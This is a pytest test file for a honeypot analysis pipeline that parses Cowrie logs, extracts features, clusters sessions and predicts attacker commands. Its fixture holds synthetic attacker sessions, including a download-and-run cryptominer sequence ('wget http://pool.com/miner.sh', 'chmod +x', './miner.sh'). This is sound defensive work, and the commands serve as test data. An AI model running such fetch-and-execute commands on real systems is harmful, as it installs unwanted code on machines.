import pytest
import json
import tempfile
import numpy as np
from datetime import datetime, timedelta
from pathlib import Path

from pipeline.main import HoneypotPipeline
from features.ast_parser import CommandASTParser
from features.temporal_features import TemporalFeatureExtractor
from features.fingerprint import FingerprintGenerator
from features.ngram_features import NGramFeatureExtractor
from models.kmeans_cluster import KMeansCluster
from models.mdp_predictor import MDPPredictor


class TestEndToEnd:
    """End-to-end integration tests."""

    @pytest.fixture
    def sample_dataset(self):
        """Create a realistic sample dataset."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_file = Path(tmpdir) / "cowrie.json"

            # Generate realistic-looking honeypot logs
            sessions = []
            base_time = datetime(2025, 1, 15, 8, 0, 0)

            # Session 1: Crypto miner pattern
            for i, cmd in enumerate(["wget http://pool.com/miner.sh", "chmod +x miner.sh", "./miner.sh", "crontab -l"]):
                sessions.append({
                    "eventid": "cowrie.command.input",
                    "timestamp": (base_time + timedelta(seconds=i * 2)).isoformat() + "Z",
                    "session": "miner_sess_1",
                    "src_ip": "192.168.1.100",
                    "input": cmd,
                    "duration": 0.5
                })

            # Session 2: Same miner, different IP
            for i, cmd in enumerate(["wget http://pool.com/miner.sh", "chmod +x miner.sh", "./miner.sh", "crontab -l"]):
                sessions.append({
                    "eventid": "cowrie.command.input",
                    "timestamp": (base_time + timedelta(seconds=i * 2 + 3600)).isoformat() + "Z",
                    "session": "miner_sess_2",
                    "src_ip": "10.0.0.50",
                    "input": cmd,
                    "duration": 0.5
                })

            # Session 3: Recon only
            for i, cmd in enumerate(["ls", "pwd", "whoami", "uname -a"]):
                sessions.append({
                    "eventid": "cowrie.command.input",
                    "timestamp": (base_time + timedelta(seconds=i * 1 + 7200)).isoformat() + "Z",
                    "session": "recon_sess_1",
                    "src_ip": "172.16.0.1",
                    "input": cmd,
                    "duration": 0.1
                })

            with open(log_file, 'w') as f:
                for event in sessions:
                    f.write(json.dumps(event) + '\n')

            yield str(tmpdir)

    def test_full_pipeline(self, sample_dataset):
        """Test complete pipeline from raw logs to sessions."""
        pipeline = HoneypotPipeline(
            log_path=sample_dataset,
            deduplicate=True,
            noise_filter=True
        )
        sessions = pipeline.run()

        assert len(sessions) >= 2  # At least miner and recon sessions
        assert all("commands" in s for s in sessions)
        assert all("command_count" in s for s in sessions)

    def test_feature_extraction_pipeline(self, sample_dataset):
        """Test feature extraction on pipeline output."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        # AST parsing
        parser = CommandASTParser()
        parsed = [parser.parse_session(s["commands"]) for s in sessions]

        assert len(parsed) == len(sessions)
        assert all("category_sequence" in p for p in parsed)

    def test_temporal_features(self, sample_dataset):
        """Test temporal feature extraction."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        extractor = TemporalFeatureExtractor()
        temporal = extractor.extract_batch(sessions)

        assert len(temporal) == len(sessions)
        assert all("session_duration" in t for t in temporal)
        assert all("mean_delta" in t for t in temporal)

    def test_fingerprinting(self, sample_dataset):
        """Test behavior fingerprint generation."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        generator = FingerprintGenerator()
        fingerprinted = generator.generate(sessions)

        assert all("behavior_fingerprint" in s for s in fingerprinted)

        # Test campaign correlation
        campaigns = generator.correlate_campaigns(fingerprinted, min_ips=2)

        # Should detect the two miner sessions as same campaign
        assert isinstance(campaigns, dict)

    def test_clustering_pipeline(self, sample_dataset):
        """Test clustering on extracted features."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        # Create simple feature matrix
        features = []
        for s in sessions:
            features.append([
                s.get("command_count", 0),
                len(set(s.get("commands", []))),
                1 if any("wget" in c for c in s.get("commands", [])) else 0,
                1 if any("chmod" in c for c in s.get("commands", [])) else 0,
            ])

        X = np.array(features)

        # K-Means
        kmeans = KMeansCluster(n_clusters=2, auto_k=False, random_state=42)
        labels = kmeans.fit_predict(X)

        assert len(labels) == len(sessions)
        assert len(set(labels)) <= 2

    def test_mdp_prediction_pipeline(self, sample_dataset):
        """Test MDP prediction on pipeline output."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        mdp = MDPPredictor(order=1)
        mdp.fit(sessions)

        assert mdp.is_fitted

        # Predict next command after wget
        predictions = mdp.predict(["wget"])

        assert len(predictions) > 0
        assert all(isinstance(p, tuple) for p in predictions)

    def test_ngram_features(self, sample_dataset):
        """Test n-gram feature extraction."""
        pipeline = HoneypotPipeline(log_path=sample_dataset)
        sessions = pipeline.run()

        extractor = NGramFeatureExtractor(n_range=(1, 2), top_k=10)
        features = extractor.fit_transform(sessions)

        assert features.shape[0] == len(sessions)
        assert features.shape[1] <= 10
        assert np.all(features >= 0)


class TestPerformance:
    """Performance benchmarks."""

    def test_parser_performance(self, benchmark):
        """Benchmark log parser performance."""
        from pipeline.parser import CowrieLogParser

        # Create temp file with 1000 events
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            for i in range(1000):
                event = {
                    "eventid": "cowrie.command.input",
                    "timestamp": "2025-01-15T08:23:17.123456Z",
                    "session": f"sess_{i}",
                    "src_ip": f"192.168.1.{i % 256}",
                    "input": f"command_{i}",
                    "duration": 0.5
                }
                f.write(json.dumps(event) + '\n')
            temp_path = f.name

        parser = CowrieLogParser()

        def parse_file():
            return list(parser.parse_file(temp_path))

        result = benchmark(parse_file)
        assert len(result) == 1000

    def test_mdp_fit_performance(self, benchmark):
        """Benchmark MDP fitting."""
        # Generate large synthetic dataset
        sessions = []
        for i in range(1000):
            commands = ["wget", "chmod", "execute", "crontab", "exit"]
            sessions.append({"commands": commands})

        mdp = MDPPredictor(order=1)

        def fit_model():
            mdp_copy = MDPPredictor(order=1)
            mdp_copy.fit(sessions)
            return mdp_copy

        result = benchmark(fit_model)
        assert result.is_fitted
